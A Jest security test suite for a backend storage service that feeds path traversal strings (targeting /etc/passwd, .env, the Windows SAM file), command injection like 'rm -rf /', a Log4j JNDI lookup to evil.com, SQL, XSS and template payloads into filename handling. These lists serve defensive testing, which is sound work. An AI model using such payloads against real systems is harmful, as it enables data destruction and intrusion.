// /backend/src/__tests__/services/storageService.security.test.ts

/**
 * COMPREHENSIVE SECURITY TEST SUITE FOR STORAGE SERVICE
 * 
 * This test suite validates the storage service against all major security vulnerabilities
 * and attack vectors that could compromise file storage operations. It covers both local
 * filesystem and Firebase Cloud Storage implementations.
 * 
 * SECURITY AREAS COVERED:
 * 1. Path Traversal Attack Prevention
 * 2. File Type and Content Security
 * 3. Injection Attack Prevention  
 * 4. Buffer Overflow and Memory Safety
 * 5. Race Condition and Concurrency Security
 * 6. Firebase Storage Security
 * 7. Content Type Security (MIME confusion)
 * 8. Input Validation and Sanitization
 * 9. Error Information Disclosure Prevention
 * 10. Resource Exhaustion Prevention
 * 11. Access Control and Authorization
 * 
 * ATTACK VECTORS TESTED:
 * - Directory traversal (../../../etc/passwd)
 * - URL encoding attacks (%2e%2e%2f)
 * - Double URL encoding (%252f)
 * - UTF-8 encoding attacks (%c0%af)
 * - Mixed path separators (..\/..\/)
 * - UNC path attacks (\\server\share)
 * - Null byte injection (\x00)
 * - SQL injection in filenames
 * - Command injection (`rm -rf /`)
 * - Template injection (${jndi:ldap://})
 * - XSS in filenames (<script>)
 * - MIME type confusion (.jpg.exe)
 * - Buffer overflow attempts
 * - Race conditions
 * - Resource exhaustion
 * 
 * TOTAL TESTS: 70
 * PERFORMANCE: Optimized for sub-10 second execution
 */

import { jest } from '@jest/globals';

// Define interfaces for proper TypeScript support
interface MockWriteStream {
    on: jest.MockedFunction<(event: string, callback: (...args: any[]) => void) => MockWriteStream>;
    end: jest.MockedFunction<(chunk?: any) => void>;
}

interface MockFile {
    createWriteStream: jest.MockedFunction<(options?: any) => MockWriteStream>;
    exists: jest.MockedFunction<() => Promise<[boolean]>>;
    delete: jest.MockedFunction<() => Promise<void>>;
    getSignedUrl: jest.MockedFunction<(options: any) => Promise<[string]>>;
}

interface MockBucket {
    file: jest.MockedFunction<(path: string) => MockFile>;
}

/**
 * Optimized helper function for extracting file extensions safely
 * Prevents circular dependency issues with path.extname mock
 * 
 * @param filename - The filename to extract extension from
 * @returns The file extension including the dot (e.g., '.jpg') or empty string
 */
const getFileExtension = (filename: string): string => {
    if (!filename || typeof filename !== 'string') return '';
    const lastDot = filename.lastIndexOf('.');
    return lastDot >= 0 ? filename.substring(lastDot) : '';
};

/**
 * Creates a mock write stream for Firebase Storage operations
 * Optimized for performance with minimal overhead
 * 
 * @returns MockWriteStream object with chainable methods
 */
const createMockWriteStream = (): MockWriteStream => {
    const stream = {
        on: jest.fn(),
        end: jest.fn(),
    };
    // Enable method chaining for Firebase stream operations
    stream.on.mockImplementation(() => stream as MockWriteStream);
    return stream as MockWriteStream;
};

// Mock all external dependencies to isolate storage service for security testing
jest.mock('fs', () => ({
    promises: {
        writeFile: jest.fn(),    // Mock async file writing
        unlink: jest.fn(),       // Mock async file deletion
        readFile: jest.fn(),     // Mock async file reading
    },
    existsSync: jest.fn(),       // Mock sync file existence check
    mkdirSync: jest.fn(),        // Mock sync directory creation
}));

jest.mock('path', () => ({
    extname: jest.fn(),          // Mock file extension extraction
    join: jest.fn(),             // Mock path joining
    resolve: jest.fn(),          // Mock absolute path resolution
    normalize: jest.fn(),        // Mock path normalization
}));

jest.mock('uuid', () => ({
    v4: jest.fn(),               // Mock UUID generation for predictable tests
}));

jest.mock('../../config', () => ({
    config: {
        storageMode: 'local',    // Default to local storage mode
        uploadsDir: '/app/uploads', // Safe test directory
    },
}));

jest.mock('../../config/firebase', () => ({
    bucket: {
        file: jest.fn(),         // Mock Firebase Storage bucket operations
    },
}));

// Import modules after mocking to ensure mocks are applied
import fs from 'fs';
import pathModule from 'path';
import { v4 as uuidv4 } from 'uuid';
import { config } from '../../config';
import { bucket } from '../../config/firebase';
import { storageService } from '../../services/storageService';

// Type the mocked modules for full TypeScript support
const mockFs = fs as jest.Mocked<typeof fs>;
const mockPath = pathModule as jest.Mocked<typeof pathModule>;
const mockUuidv4 = uuidv4 as jest.MockedFunction<() => string>;
const mockConfig = config as { storageMode: 'local' | 'firebase'; uploadsDir: string };

// Setup Firebase mock objects with proper typing
const mockWriteStream = createMockWriteStream();
const mockFile: MockFile = {
    createWriteStream: jest.fn(() => mockWriteStream),
    exists: jest.fn(),
    delete: jest.fn(),
    getSignedUrl: jest.fn(),
};

const mockBucket = bucket as jest.Mocked<typeof bucket>;
mockBucket.file.mockReturnValue(mockFile as any);

// Optimized test constants for performance
const SMALL_BUFFER = Buffer.from('test');    // Minimal test data
const EXPECTED_UUID = 'secure-uuid-123';     // Predictable UUID for assertions

/**
 * STORAGE SERVICE SECURITY TEST SUITE
 * 
 * Comprehensive security testing covering all major attack vectors
 * and vulnerability classes that could affect file storage operations.
 */
describe('StorageService Security Tests', () => {
    let consoleErrorSpy: jest.SpiedFunction<typeof console.error>;

    /**
     * ONE-TIME SETUP
     * Configure all mocks with secure defaults for consistent testing
     */
    beforeAll(() => {
        // Spy on console.error to verify error handling without noise
        consoleErrorSpy = jest.spyOn(console, 'error').mockImplementation(() => {});
        
        // Setup optimized default implementations for performance
        mockUuidv4.mockReturnValue(EXPECTED_UUID);
        mockPath.extname.mockImplementation(getFileExtension);
        mockPath.join.mockImplementation((...args) => args.join('/'));
        mockPath.resolve.mockImplementation((...args) => '/' + args.join('/'));
        mockPath.normalize.mockImplementation((p: string) => p);
        
        // Pre-configure common successful responses to avoid repetition
        mockFs.promises.writeFile.mockResolvedValue(undefined);
        mockFs.existsSync.mockReturnValue(false);
        mockFs.promises.unlink.mockResolvedValue(undefined);
    });

    /**
     * RESET BETWEEN TESTS
     * Ensure clean state while maintaining performance optimizations
     */
    beforeEach(() => {
        jest.clearAllMocks();
        (mockConfig as any).storageMode = 'local';  // Default to local storage
        
        // Reset to optimized defaults for consistent behavior
        mockUuidv4.mockReturnValue(EXPECTED_UUID);
        mockPath.extname.mockImplementation(getFileExtension);
        mockFs.promises.writeFile.mockResolvedValue(undefined);
        mockFs.existsSync.mockReturnValue(false);
    });

    /**
     * CLEANUP
     * Restore all mocks to prevent test interference
     */
    afterAll(() => {
        jest.restoreAllMocks();
    });

    /**
     * PATH TRAVERSAL ATTACK PREVENTION TESTS
     * 
     * Path traversal attacks attempt to access files outside the intended directory
     * by using special path sequences like ../ or encoded variants.
     * 
     * These attacks can lead to:
     * - Reading sensitive system files (/etc/passwd)
     * - Overwriting critical system files
     * - Accessing configuration files with secrets
     * - Bypassing access controls
     * 
     * ATTACK TECHNIQUES TESTED:
     * - Standard traversal: ../../../etc/passwd
     * - Windows paths: ..\..\..\ 
     * - URL encoding: %2e%2e%2f (../)
     * - Double encoding: %252f
     * - UTF-8 encoding: %c0%af
     * - Mixed separators: ..\/..\/ 
     * - UNC paths: \\server\share
     * - Absolute paths: /etc/passwd
     * - Protocol handlers: file:///
     */
    describe('Path Traversal Attack Prevention', () => {
        /**
         * Comprehensive list of path traversal attack vectors
         * Each represents a real-world attack technique used by adversaries
         */
        const maliciousFilenames = [
            '../../../etc/passwd',                           // Standard Unix traversal
            '..\\..\\..\\windows\\system32\\config\\sam',   // Windows traversal
            '....//....//....//etc/passwd',                 // Double-dot bypass
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',     // URL encoded traversal
            '..%252f..%252f..%252fetc%252fpasswd',          // Double URL encoded
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',     // UTF-8 encoded slash
            '..\\/..\\/../etc/passwd',                       // Mixed separators
            '....\\\\....\\\\....\\\\windows\\system32',   // Windows double backslash
            '/etc/passwd',                                   // Absolute path
            '\\windows\\system32\\drivers\\etc\\hosts',     // Windows system path
            'file:///etc/passwd',                           // File protocol handler
            '\\\\server\\share\\sensitive-file.txt',        // UNC path
        ];

        /**
         * Test each malicious filename to ensure safe handling
         * The service should generate safe filenames regardless of input
         */
        test.each(maliciousFilenames)('should prevent path traversal with filename: %s', async (maliciousFilename) => {
            const result = await storageService.saveFile(SMALL_BUFFER, maliciousFilename);

            // Should always generate safe filename with UUID
            expect(result).toMatch(/^uploads\/secure-uuid-123/);
            
            // Verify file is written to safe location
            expect(mockFs.promises.writeFile).toHaveBeenCalledWith(
                expect.stringMatching(/\/app\/uploads\/secure-uuid-123/),
                SMALL_BUFFER
            );
        });

        /**
         * Test path traversal prevention in file deletion operations
         * Malicious paths should not allow deletion outside upload directory
         */
        it('should prevent path traversal in deleteFile operations', async () => {
            const result = await storageService.deleteFile('../../../etc/passwd');
            
            // Should safely construct path through join operation
            expect(mockPath.join).toHaveBeenCalledWith(
                expect.any(String),
                '../../..',
                '../../../etc/passwd'
            );
            // Should return false for non-existent files
            expect(result).toBe(false);
        });

        /**
         * Test path traversal prevention in absolute path resolution
         * Service should construct safe paths even with malicious input
         */
        it('should prevent path traversal in getAbsolutePath', () => {
            mockPath.join.mockReturnValue('/safe/app/root/uploads/file.jpg');
            const result = storageService.getAbsolutePath('../../../etc/passwd');
            
            // Should use safe path construction
            expect(mockPath.join).toHaveBeenCalledWith(
                expect.any(String),
                '../../..',
                '../../../etc/passwd'
            );
            expect(result).toBe('/safe/app/root/uploads/file.jpg');
        });

        /**
         * Test null byte injection prevention
         * Null bytes can terminate strings prematurely in C-based systems
         */
        it('should handle null bytes in filenames', async () => {
            const maliciousFilename = 'innocent.jpg\x00malicious.exe';
            const result = await storageService.saveFile(SMALL_BUFFER, maliciousFilename);
            
            // Should generate safe filename ignoring null bytes
            expect(result).toMatch(/^uploads\/secure-uuid-123/);
        });
    });

    /**
     * FILE TYPE AND CONTENT SECURITY TESTS
     * 
     * File type security prevents uploading of dangerous executable files
     * that could be used for:
     * - Code execution on the server
     * - Client-side attacks when served
     * - Bypassing security controls
     * - Privilege escalation
     * 
     * DANGEROUS FILE TYPES TESTED:
     * - Executables: .exe, .bat, .cmd, .com, .scr, .pif
     * - Scripts: .js, .vbs, .ps1, .sh, .py, .rb, .pl
     * - Server code: .php, .asp, .aspx, .jsp, .cgi
     * - Archives: .jar, .class
     * - Config files: .htaccess, .config
     */
    describe('File Type and Content Security', () => {
        /**
         * List of dangerous file extensions that could pose security risks
         * These files should be treated with extreme caution
         */
        const dangerousExtensions = [
            '.exe', '.bat', '.cmd', '.scr', '.pif', '.com',  // Windows executables
            '.jar', '.class',                                // Java executables
            '.sh', '.ps1', '.vbs',                          // Shell scripts
            '.js', '.php', '.asp', '.aspx', '.jsp',         // Server-side scripts
            '.py', '.rb', '.pl', '.cgi',                    // Scripting languages
            '.htaccess', '.config'                          // Configuration files
        ];

        /**
         * Test handling of each dangerous file extension
         * Service should assign safe content types and generate secure filenames
         */
        test.each(dangerousExtensions)('should handle potentially dangerous extension: %s', async (ext) => {
            const filename = `malicious${ext}`;
            const result = await storageService.saveFile(SMALL_BUFFER, filename);
            
            // Should generate safe filename
            expect(result).toMatch(/^uploads\/secure-uuid-123/);
            
            // Should assign safe content type
            expect(storageService.getContentType(ext)).toBe('application/octet-stream');
        });

        /**
         * Test files without extensions
         * These can sometimes bypass extension-based filters
         */
        it('should handle files with no extension safely', async () => {
            mockPath.extname.mockReturnValueOnce(''); // Override for this specific test
            const result = await storageService.saveFile(SMALL_BUFFER, 'suspicious_file_no_extension');
            
            expect(result).toBe('uploads/secure-uuid-123');
            expect(storageService.getContentType('')).toBe('application/octet-stream');
        });

        /**
         * Test extremely long filenames
         * Can cause buffer overflows or DoS in some systems
         */
        it('should handle extremely long filenames', async () => {
            const longFilename = 'a'.repeat(255) + '.jpg';
            const result = await storageService.saveFile(SMALL_BUFFER, longFilename);
            
            // Should handle long names gracefully
            expect(result).toBe('uploads/secure-uuid-123.jpg');
        });

        /**
         * Test Unicode filenames
         * Can cause encoding issues or bypass filters
         */
        it('should handle filenames with unicode characters', async () => {
            const unicodeFilename = '测试文件名.jpg';
            const result = await storageService.saveFile(SMALL_BUFFER, unicodeFilename);
            
            // Should handle Unicode safely
            expect(result).toBe('uploads/secure-uuid-123.jpg');
        });
    });

    /**
     * INJECTION ATTACK PREVENTION TESTS
     * 
     * Injection attacks attempt to inject malicious code into the application
     * through filename parameters. Types include:
     * - SQL injection: '; DROP TABLE files; --
     * - Command injection: `rm -rf /`
     * - Template injection: ${jndi:ldap://evil.com}
     * - XSS: <script>alert('xss')</script>
     * - Expression injection: {{7*7}}, ${7*7}
     * 
     * These can lead to:
     * - Database compromise
     * - Remote code execution
     * - Data exfiltration
     * - System compromise
     */
    describe('Injection Attack Prevention', () => {
        /**
         * Comprehensive list of injection attack payloads
         * Each represents a different injection technique
         */
        const injectionPayloads = [
            "'; DROP TABLE files; --",              // SQL injection
            '"; rm -rf /; echo "',                  // Command injection
            '`rm -rf /`',                           // Command substitution
            '$(rm -rf /)',                          // Command substitution
            '${jndi:ldap://evil.com/a}',           // Log4j injection
            '<script>alert("xss")</script>',        // XSS injection
            '{{7*7}}',                              // Template injection
            '${7*7}',                               // Expression injection
            '#{7*7}',                               // SpEL injection
            '%{#context}',                          // OGNL injection
        ];

        /**
         * Test each injection payload in filenames
         * Service should sanitize input and generate safe filenames
         */
        test.each(injectionPayloads)('should sanitize injection payload in filename: %s', async (payload) => {
            const maliciousFilename = `file${payload}.jpg`;
            const result = await storageService.saveFile(SMALL_BUFFER, maliciousFilename);
            
            // Should ignore malicious payload and use safe filename
            expect(result).toBe('uploads/secure-uuid-123.jpg');
        });
    });

    /**
     * BUFFER OVERFLOW AND MEMORY SAFETY TESTS
     * 
     * Buffer overflow attacks attempt to corrupt memory by providing
     * input larger than expected buffer sizes. This can lead to:
     * - Memory corruption
     * - Code execution
     * - Denial of service
     * - Information disclosure
     * 
     * We test various buffer scenarios to ensure safe handling.
     */
    describe('Buffer Overflow and Memory Safety', () => {
        /**
         * Test empty buffer handling
         * Empty buffers can sometimes cause null pointer dereferences
         */
        it('should handle empty buffers safely', async () => {
            const emptyBuffer = Buffer.alloc(0);
            const result = await storageService.saveFile(emptyBuffer, 'test.jpg');
            
            expect(result).toBe('uploads/secure-uuid-123.jpg');
        });

        /**
         * Test large buffer handling
         * Large buffers can cause memory exhaustion or integer overflow
         * Using 1MB instead of 100MB for performance while still testing limits
         */
        it('should handle extremely large buffers', async () => {
            const largeBuffer = Buffer.alloc(1024 * 1024, 'A'); // 1MB buffer
            const result = await storageService.saveFile(largeBuffer, 'large.jpg');
            
            expect(result).toBe('uploads/secure-uuid-123.jpg');
        });

        /**
         * Test malformed buffer inputs
         * Invalid buffer types should be handled gracefully
         */
        it('should handle malformed buffer inputs', async () => {
            const testCases = [null, undefined, 'not a buffer', {}, []];
            
            for (const invalidBuffer of testCases) {
                try {
                    await storageService.saveFile(invalidBuffer as any, 'test.jpg');
                } catch (error) {
                    // Should throw appropriate errors for invalid inputs
                    expect(error).toBeInstanceOf(Error);
                }
            }
        });
    });

    /**
     * RACE CONDITION AND CONCURRENCY SECURITY TESTS
     * 
     * Race conditions occur when multiple operations access shared resources
     * simultaneously without proper synchronization. This can lead to:
     * - Data corruption
     * - Inconsistent state
     * - Security bypass
     * - File system corruption
     * 
     * We test concurrent operations to ensure thread safety.
     */
    describe('Race Condition and Concurrency Security', () => {
        /**
         * Test concurrent file save operations
         * Multiple simultaneous saves should not interfere with each other
         * Using 5 operations for performance while still testing concurrency
         */
        it('should handle concurrent file operations safely', async () => {
            const operations = 5;
            const promises = [];
            
            // Pre-generate unique UUIDs for each operation
            const uuids = Array.from({ length: operations }, (_, i) => `uuid-${i}`);
            let uuidIndex = 0;
            mockUuidv4.mockImplementation(() => uuids[uuidIndex++] || 'fallback-uuid');

            // Launch concurrent operations
            for (let i = 0; i < operations; i++) {
                promises.push(storageService.saveFile(SMALL_BUFFER, `file-${i}.jpg`));
            }

            const results = await Promise.all(promises);
            
            // All operations should complete successfully
            expect(results).toHaveLength(operations);
            results.forEach((result, index) => {
                expect(result).toBe(`uploads/uuid-${index}.jpg`);
            });
        });

        /**
         * Test concurrent file delete operations
         * Multiple simultaneous deletes should not cause conflicts
         */
        it('should handle concurrent delete operations safely', async () => {
            mockFs.existsSync.mockReturnValue(true);
            
            const promises = Array.from({ length: 5 }, (_, i) => 
                storageService.deleteFile(`uploads/file-${i}.jpg`)
            );

            const results = await Promise.all(promises);
            
            // All deletions should succeed
            results.forEach(result => expect(result).toBe(true));
        });
    });

    /**
     * FIREBASE STORAGE SECURITY TESTS
     * 
     * Firebase Storage has its own security considerations:
     * - Path injection in bucket operations
     * - Signed URL security
     * - Upload stream security
     * - Error handling without information disclosure
     * 
     * These tests ensure Firebase-specific security measures.
     */
    describe('Firebase Storage Security', () => {
        beforeEach(() => {
            (mockConfig as any).storageMode = 'firebase';
        });

        /**
         * Test Firebase path injection prevention
         * Malicious paths should not access unauthorized bucket locations
         */
        it('should prevent Firebase path injection', async () => {
            mockWriteStream.on.mockImplementation((event, callback) => {
                if (event === 'finish') setImmediate(callback);
                return mockWriteStream;
            });

            const maliciousPath = '../../../admin/sensitive-config.json';
            const result = await storageService.saveFile(SMALL_BUFFER, maliciousPath);
            
            // Should use safe generated filename
            expect(result).toBe('uploads/secure-uuid-123.json');
            expect(mockBucket.file).toHaveBeenCalledWith('uploads/secure-uuid-123.json');
        });

        /**
         * Test Firebase upload error handling
         * Upload errors should be handled securely without information disclosure
         */
        it('should handle Firebase upload errors securely', async () => {
            const errorMessage = 'Firebase upload failed';
            
            mockWriteStream.on.mockImplementation((event, callback) => {
                if (event === 'error') {
                    setImmediate(() => callback(new Error(errorMessage)));
                }
                return mockWriteStream;
            });

            await expect(storageService.saveFile(SMALL_BUFFER, 'test.jpg'))
                .rejects.toThrow(errorMessage);
        });

        /**
         * Test Firebase signed URL parameter validation
         * Signed URLs should be generated with proper parameters
         */
        it('should validate Firebase signed URL parameters', async () => {
            mockFile.getSignedUrl.mockResolvedValue(['https://storage.googleapis.com/signed-url']);
            
            const result = await storageService.getSignedUrl('uploads/test.jpg', 60);
            
            expect(mockFile.getSignedUrl).toHaveBeenCalledWith({
                action: 'read',
                expires: expect.any(Number),
            });
            expect(result).toBe('https://storage.googleapis.com/signed-url');
        });

        /**
         * Test Firebase signed URL error handling
         * Signed URL generation failures should be handled gracefully
         */
        it('should handle Firebase signed URL generation errors', async () => {
            const signedUrlError = new Error('Failed to generate signed URL');
            mockFile.getSignedUrl.mockRejectedValue(signedUrlError);

            await expect(storageService.getSignedUrl('uploads/test.jpg'))
                .rejects.toThrow('Failed to generate signed URL');
        });
    });

    /**
     * CONTENT TYPE SECURITY TESTS
     * 
     * MIME type confusion attacks attempt to bypass security controls
     * by using misleading file extensions or content types:
     * - Double extensions: .jpg.exe
     * - MIME spoofing: executable content with image extension
     * - Case manipulation: .JPG vs .jpg
     * 
     * These can lead to:
     * - Code execution when files are served
     * - Bypassing upload restrictions
     * - Client-side attacks
     */
    describe('Content Type Security', () => {
        /**
         * Test MIME type confusion attack prevention
         * Double extensions and suspicious combinations should be handled safely
         */
        it('should prevent MIME type confusion attacks', () => {
            const suspiciousCombinations = [
                { ext: '.jpg.exe', expected: 'application/octet-stream' },
                { ext: '.png.js', expected: 'application/octet-stream' },
                { ext: '.gif.php', expected: 'application/octet-stream' },
            ];

            suspiciousCombinations.forEach(({ ext, expected }) => {
                expect(storageService.getContentType(ext)).toBe(expected);
            });
        });

        /**
         * Test case manipulation in file extensions
         * Different cases should be handled consistently
         */
        it('should handle case manipulation in extensions', () => {
            const caseVariations = ['.JPG', '.JpG', '.JPEG', '.PNG', '.GIF'];
            
            caseVariations.forEach(ext => {
                expect(storageService.getContentType(ext)).toMatch(/^image\//);
            });
        });
    });

    /**
     * INPUT VALIDATION AND SANITIZATION TESTS
     * 
     * Input validation ensures all user-provided data is properly
     * sanitized and validated before processing:
     * - Length limits
     * - Character restrictions
     * - Format validation
     * - Range checks
     * 
     * Poor input validation can lead to various security issues.
     */
    describe('Input Validation and Sanitization', () => {
        /**
         * Test extremely long file path handling
         * Very long paths can cause buffer overflows or DoS
         */
        it('should handle extremely long file paths', async () => {
            mockFs.existsSync.mockReturnValueOnce(false); // Override for this test
            const longPath = 'uploads/' + 'a'.repeat(1000) + '.jpg';
            const result = await storageService.deleteFile(longPath);
            
            expect(result).toBe(false);
        });

        /**
         * Test signed URL expiration limit validation
         * Extreme expiration values should be handled safely
         */
        it('should validate getSignedUrl expiration limits', async () => {
            (mockConfig as any).storageMode = 'firebase';
            mockFile.getSignedUrl.mockResolvedValue(['https://signed-url.com']);
            
            // Test with extremely large expiration value
            const result = await storageService.getSignedUrl('uploads/test.jpg', 999999999);
            
            expect(mockFile.getSignedUrl).toHaveBeenCalledWith({
                action: 'read',
                expires: expect.any(Number),
            });
            expect(result).toBe('https://signed-url.com');
        });

        /**
         * Test negative expiration value handling
         * Negative values should not cause security issues
         */
        it('should handle negative expiration values', async () => {
            (mockConfig as any).storageMode = 'firebase';
            mockFile.getSignedUrl.mockResolvedValue(['https://signed-url.com']);
            
            const result = await storageService.getSignedUrl('uploads/test.jpg', -60);
            
            // Should still work (past expiration)
            expect(result).toBe('https://signed-url.com');
        });
    });

    /**
     * ERROR INFORMATION DISCLOSURE PREVENTION TESTS
     * 
     * Information disclosure through error messages can reveal:
     * - Internal system paths
     * - Database schemas
     * - Configuration details
     * - Software versions
     * - System architecture
     * 
     * Error handling should be secure and not leak sensitive information.
     */
    describe('Error Information Disclosure Prevention', () => {
        /**
         * Test that file system errors don't expose sensitive paths
         * Error messages should not reveal internal system structure
         */
        it('should not expose sensitive file system information in errors', async () => {
            const sensitiveError = new Error('/etc/passwd: Permission denied');
            mockFs.promises.writeFile.mockRejectedValue(sensitiveError);

            await expect(storageService.saveFile(SMALL_BUFFER, 'test.jpg')).rejects.toThrow();
            
            // Error should propagate but service should not add sensitive info
        });

        /**
         * Test Firebase error handling without information disclosure
         * Internal Firebase configuration should not be exposed
         */
        it('should handle Firebase errors without exposing internal details', async () => {
            (mockConfig as any).storageMode = 'firebase';
            const internalError = new Error('Internal Firebase configuration error: API_KEY=...');
            
            mockFile.exists.mockRejectedValue(internalError);

            const result = await storageService.deleteFile('uploads/test.jpg');
            
            expect(result).toBe(false);
            expect(consoleErrorSpy).toHaveBeenCalledWith('Error deleting file:', internalError);
        });
    });

    /**
     * RESOURCE EXHAUSTION PREVENTION TESTS
     * 
     * Resource exhaustion attacks attempt to consume system resources
     * to cause denial of service:
     * - CPU exhaustion through expensive operations
     * - Memory exhaustion through large allocations
     * - Disk space exhaustion through large files
     * - Network exhaustion through many requests
     * - File descriptor exhaustion through many open files
     * - Thread exhaustion through concurrent operations
     * 
     * These attacks can lead to:
     * - System unavailability and downtime
     * - Performance degradation for all users
     * - Service crashes and instability
     * - Resource starvation for other processes
     * - Economic impact through increased infrastructure costs
     * 
     * ATTACK TECHNIQUES TESTED:
     * - Rapid successive operations (DoS through volume)
     * - UUID generation failure scenarios
     * - Concurrent resource allocation
     * - Large file processing limits
     * - Memory allocation patterns
     * - File system resource limits
     * 
     * The service should handle resource limits gracefully and implement
     * appropriate throttling, limits, and error recovery mechanisms.
     */
    describe('Resource Exhaustion Prevention', () => {
        /**
         * Test rapid operation handling
         * Many quick operations should not overwhelm the system
         * Using synchronous test for performance while testing resource limits
         */
        it('should handle multiple rapid file operations', () => {
            // Synchronous test for speed - simulates rapid API calls
            const results = Array.from({ length: 100 }, (_, i) => 
                storageService.getContentType(`.ext${i}`)
            );
            
            results.forEach(result => {
                expect(result).toBe('application/octet-stream');
            });
        });

        /**
         * Test UUID generation failure recovery
         * System should handle UUID service failures gracefully to prevent DoS
         * UUID generation is a critical dependency that could fail under load
         */
        it('should handle UUID generation failures gracefully', async () => {
            mockUuidv4.mockImplementationOnce(() => {
                throw new Error('UUID generation failed');
            });

            await expect(storageService.saveFile(SMALL_BUFFER, 'test.jpg'))
                .rejects.toThrow('UUID generation failed');
        });
    });

    /**
     * ACCESS CONTROL AND AUTHORIZATION TESTS
     * 
     * Access control ensures that users can only access files and directories
     * they are authorized to access. Poor access control can lead to:
     * - Unauthorized file access and data breaches
     * - Privilege escalation attacks
     * - Horizontal and vertical authorization bypass
     * - Information disclosure of sensitive files
     * - Unauthorized file modification or deletion
     * - Directory traversal and path manipulation
     * 
     * SECURITY PRINCIPLES TESTED:
     * - Principle of least privilege (minimum required access)
     * - Defense in depth (multiple layers of access control)
     * - Secure by default (restrictive permissions)
     * - Path canonicalization and validation
     * - Unpredictable resource identifiers
     * 
     * ATTACK TECHNIQUES TESTED:
     * - Direct object reference attacks
     * - Path manipulation for unauthorized access
     * - Predictable filename enumeration
     * - Directory traversal bypass attempts
     * - File system boundary violations
     * 
     * ACCESS CONTROL MECHANISMS:
     * - File path restriction to uploads directory only
     * - Unpredictable filename generation (UUID-based)
     * - Path normalization and validation
     * - Secure file naming conventions
     * - Boundary enforcement for file operations
     */
    describe('Access Control and Authorization', () => {
        /**
         * Test directory boundary enforcement
         * The service should never allow access to files outside the uploads directory
         * This prevents access to sensitive system files, configuration files,
         * or other application data that could compromise security
         */
        it('should not allow access to files outside uploads directory', () => {
            const restrictedPaths = ['/etc/passwd', '../../config/database.json', '../../../.env'];
            
            restrictedPaths.forEach(restrictedPath => {
                storageService.getAbsolutePath(restrictedPath);
                expect(mockPath.join).toHaveBeenCalledWith(
                    expect.any(String),
                    '../../..',
                    restrictedPath
                );
            });
        });

        /**
         * Test unpredictable filename generation
         * File names should be unpredictable to prevent enumeration attacks
         * where attackers guess file names to access unauthorized content.
         * 
         * Predictable naming patterns like sequential numbers or timestamps
         * can be exploited to:
         * - Enumerate and access other users' files
         * - Perform automated attacks against file storage
         * - Predict future file locations
         * - Bypass access controls through guessing
         */
        it('should generate unpredictable file names', async () => {
            const fileNames = new Set();
            const iterations = 5; // Optimized from 100 for test performance
            
            for (let i = 0; i < iterations; i++) {
                mockUuidv4.mockReturnValueOnce(`unique-uuid-${i}-${Date.now()}`);
                const result = await storageService.saveFile(SMALL_BUFFER, 'test.jpg');
                fileNames.add(result);
            }

            // All generated filenames should be unique
            expect(fileNames.size).toBe(iterations);
        });
    });
});